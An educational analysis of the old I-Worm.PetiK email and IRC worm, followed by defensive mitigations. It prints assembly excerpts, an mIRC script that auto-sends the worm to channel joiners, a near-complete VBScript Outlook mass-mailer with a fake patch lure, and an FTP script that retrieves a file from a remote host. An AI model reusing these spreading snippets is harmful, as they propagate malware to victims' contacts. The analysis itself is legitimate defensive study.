# Dissecting I‑Worm.PetiK: An Assembly‑Based Email and IRC Worm 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
I‑Worm.PetiK (compiled as ie042601.exe) is a Windows 9x/ME–era worm implemented in x86 assembly that leverages legacy operating system features and client automation to spread. The sample hides itself from the task list by registering as a “service process,” persists via the classic WIN.INI [windows] run entry, and weaponizes two propagation vectors: (1) IRC via mIRC script injection to auto‑send the worm on channel joins, and (2) email via a dropped VBScript mass‑mailer. It also attempts a basic network operation—fetching a remote BMP via FTP—and then sets it as the desktop wallpaper, while hiding other BMPs in the Windows folder.

Analyzing this code shows how little was needed to cause disruption in 2001: direct Windows API calls for file/registry manipulation, simple string building for scripts, and mail/IRC automation. Understanding these mechanics helps defenders recognize analogous behaviors today, even as platforms and defenses have evolved.

## Section 1 – Overview of the Malware 🐛
I‑Worm.PetiK’s workflow follows a predictable sequence:
- Stealth: Calls RegisterServiceProcess so the process won’t show in the Ctrl+Alt+Del task list on Windows 9x/ME.
- Self‑copy and persistence: Copies itself to the system directory as ie042601.exe and writes WIN.INI [windows] run entries to ensure execution at startup.
- IRC propagation: Generates a script.ini that issues “/dcc send” of the worm to any user joining a channel; copies it into typical mIRC locations (C:\mirc and C:\mirc32).
- Email propagation: Drops a read‑only EMail.vbs under the Windows directory; the VBScript iterates Outlook address books and sends a social‑engineering email titled “The last patch for Internet Explorer” with the worm attached.
- Network/visual payload: Creates an FTP script (C:\Win.drv) and a batch file (wsock32.bat) to retrieve an image from members.aol.com and set it as the desktop wallpaper; also hides BMP files in the Windows directory by changing attributes.

Targets are consumer systems where Outlook, mIRC, and the legacy service‑process API exist. Infection vectors include direct execution (social engineering) followed by peer‑to‑peer spread via IRC and mass email. There is no advanced obfuscation; persistence and propagation rely on default‑permissive settings.

## Section 2 – Source Code Analysis 🔬
The assembly uses kernel32, advapi32, user32, and wsock32 APIs. Labels organize stages: DEBUT (entry), COPIE (copying), WIN_INI (persistence), SCRIPT (mIRC), EMAIL (VBS drop), FTP/EXEC (network & batch), CONNECT/BAT (network check and execution), BDR (wallpaper settings), and a file‑attribute loop.

### Stealth via “Service Process”
```asm
call GetCurrentProcessId
push 01h
push eax
call RegisterServiceProcess ; hides the process in Win9x task list
```
- On Windows 9x/ME, this prevents appearance in the Ctrl+Alt+Del task manager, providing crude stealth.

### Self‑Copy to System Directory
```asm
push 00h
call GetModuleHandleA
push 260
push offset szOrig
push eax
call GetModuleFileNameA
push 260
push offset szCopie
call GetSystemDirectoryA
push offset Copie            ; "\ie042601.exe"
push offset szCopie
call lstrcat
push 00h
push offset szCopie
push offset szOrig
call CopyFileA               ; %SystemDir%\ie042601.exe
```
- Resolves its own path and copies into the system directory under a plausible IE‑like name.

### Persistence via WIN.INI
```asm
push 260
push offset szWinini
call GetWindowsDirectoryA
push offset Winini           ; "\\WIN.INI"
push offset szWinini
call lstrcat
push offset szWinini
push offset szCopie          ; value: %SysDir%\ie042601.exe
push offset run              ; key:   run
push offset windows          ; sect:  [windows]
call WritePrivateProfileStringA
```
- Uses the legacy WIN.INI autorun instead of registry Run keys—noisy but effective on the era’s systems.

### IRC Script Injection (mIRC)
```asm
; Build C:\script.ini with lines:
; [script]
; n0=on 1:JOIN:#:{
; n1= /if ( $nick == $me ) { halt }
; n2= /.dcc send $nick <full path to ie042601.exe>
; n3=}
push offset inifile          ; "C:\script.ini"
; ... CreateFileA/WriteFile of template inid + path
push 00h
push offset script1          ; copy to C:\mirc\script.ini
push offset inifile
call CopyFileA
push 00h
push offset script2          ; copy to C:\mirc32\script.ini
push offset inifile
call CopyFileA
call DeleteFileA             ; remove the original from C:\
```
- The worm ensures that on any channel JOIN, mIRC will DCC‑send the worm binary to the joining nick. The repo’s `script.ini` reflects this behavior.

### Dropped VBScript Mass‑Mailer
```asm
; Create %WinDir%\EMail.vbs (read‑only) from embedded string vbsd
push 260
push offset szVBS
call GetWindowsDirectoryA
push offset vbsfile          ; "\EMail.vbs"
push offset szVBS
call lstrcat
; CreateFileA with FILE_ATTRIBUTE_READONLY, then WriteFile vbsd
```
The embedded VBScript iterates Outlook contacts and emails the worm with a social‑engineering lure:
```vb
Set OApp=CreateObject("Outlook.Application")
If OApp="Outlook" Then
  Set Mapi = OApp.GetNameSpace("MAPI")
  For Each AddList In Mapi.AddressLists
    For AddListCount = 1 To AddList.AddressEntries.Count
      Set msg = OApp.CreateItem(0)
      msg.Subject = "The last patch for Internet Explorer"
      msg.Body    = "...This patch allows you to correct this problem"
      msg.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(1),"\ie042601.exe")
      msg.Send
    Next
  Next
End If
```
- The email body claims to deliver an IE security patch, enticing victims to run the attached executable from the system directory.

### Batch and FTP Script: Email Trigger + Remote Image
```asm
; Create WSOCK32.BAT in %WinDir%
@echo off
if exist C:\WINDOWS\EMail.vbs start C:\WINDOWS\EMail.vbs
... (checks several Win dirs)
start ftp -i -v -s:C:\Win.drv
```
```asm
; Create hidden C:\Win.drv (FTP script)
open
members.aol.com
pentasm99
lcd C:\
bin
get petik.bmp
bye
exit
```
- The batch launches EMail.vbs if present and then starts FTP with a scripted session (`-s:C:\Win.drv`) to fetch `petik.bmp` from members.aol.com using the username “pentasm99” (password omitted/not present). This is rudimentary C2/file retrieval.
- Before running, the worm tests connectivity by calling `gethostbyname` on a “yahoo” string. Note: the code’s string includes an HTTP scheme in comments but the API requires a bare hostname—an implementation quirk.

### Desktop Wallpaper Change and Hiding BMPs
```asm
; HKCU\Control Panel\Desktop: TileWallpaper=0, WallpaperStyle=2
push KEY_SET_VALUE
call RegOpenKeyExA
call RegSetValueExA ; TileWallpaper -> "0"
call RegSetValueExA ; WallpaperStyle -> "2"
; Set C:\petik.bmp as wallpaper
push SPI_SETDESKWALLPAPER
call SystemParametersInfoA
```
```asm
; In %WinDir%, for each *.bmp: SetFileAttributesA(HIDDEN)
push offset FICHIER   ; "*.bmp"
call FindFirstFileA
; loop -> call SetFileAttributesA 02h
```
- The worm sets the downloaded image as the desktop background and makes other BMPs in the Windows folder hidden (comments mention read‑only too; the code sets Hidden).

## Section 3 – Mitigation and Defense Strategies 🛡️
- Kill legacy autoruns. Monitor and block modifications to WIN.INI [windows] run entries; centrally enforce that startup items only originate from approved mechanisms. On modern systems, legacy INI autoruns should be empty.
- Lock down Windows Script Host and Outlook automation. Disable WSH for standard users or via policy; block programmatic Outlook access or require prompts/consent. Gate execution of .vbs files and flag creation of %WinDir%\EMail.vbs.
- Watch for mIRC script tampering and DCC. Alert on creation or changes to `C:\mirc\script.ini` and `C:\mirc32\script.ini`, especially lines that include “/dcc send”. Consider blocking DCC at the network perimeter or chat servers.
- Detect suspicious batch/FTP activity. Flag creation and execution of `%WinDir%\wsock32.bat` and `%SystemDrive%\Win.drv`. Alert on ftp.exe with `-s:` arguments and outbound connections to personal hosting domains (e.g., members.aol.com).
- Registry and desktop changes. Monitor HKCU\Control Panel\Desktop value changes (TileWallpaper/WallpaperStyle) and calls to SystemParametersInfoA with SPI_SETDESKWALLPAPER. Track unexpected wallpaper changes from non‑UI processes.
- File‑attribute anomalies. Detect bulk attribute changes to Hidden for *.bmp in %WinDir%. EDR can highlight SetFileAttributesA bursts from the worm’s process.
- Network/endpoint correlation. Combine DNS failures/retries plus batch execution and Outlook mass‑send behaviors as a high‑confidence behavioral signature.
- Least privilege and backups. Running as a limited user reduces write access to system directories and WIN.INI. Maintain backups for rapid rollback of cosmetic changes.

## Conclusion
I‑Worm.PetiK demonstrates a compact, effective blend of Win9x‑specific stealth, legacy autoruns, and dual propagation via IRC and email. Its assembly implementation offers direct control over Windows APIs to drop scripts, modify system appearance, and automate social engineering lures. Even if many techniques are dated, the behavioral patterns—script injection for IRC, programmatic Outlook emails, scripted FTP retrieval, and registry/UI changes—persist in modern malware families with updated tooling. By instrumenting these actions and educating users about email/IRC lures, defenders can detect and contain both archival samples like this one and their contemporary counterparts that reuse the same playbook.